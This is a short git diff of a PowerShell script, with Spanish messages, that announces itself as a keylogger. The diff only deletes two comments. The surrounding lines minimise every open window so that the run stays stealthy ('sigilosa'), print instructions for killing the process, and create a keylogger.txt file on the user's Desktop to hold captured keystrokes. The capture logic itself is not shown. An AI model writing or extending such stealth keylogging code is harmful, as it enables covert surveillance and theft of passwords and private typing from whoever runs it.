@@ -36,7 +36,7 @@ $shell = New-Object -ComObject Shell.Application
 $hwnd = (Get-Process -Id $PID).MainWindowHandle
 $shell.MinimizeAll()
 
-# Mostrar mensajes iniciales
+
 Write-Color "[+] Iniciando Keylogger..." Cyan
 Start-Sleep -Seconds 1
 
@@ -48,7 +48,7 @@ Write-Color "    2º - Finalizar el proceso:" Green
 Write-Color "        Stop-Process -Id <ID_PROCESS> -Force" DarkGray
 Write-Color "[+] La ventana actual se minimiza para que la ejecución sea sigilosa." Cyan
 
-# Tu script original comienza aquí
+
 $path = "$env:USERPROFILE\Desktop\keylogger.txt"
 
 if ((Test-Path $path) -eq $false) {New-Item $path}
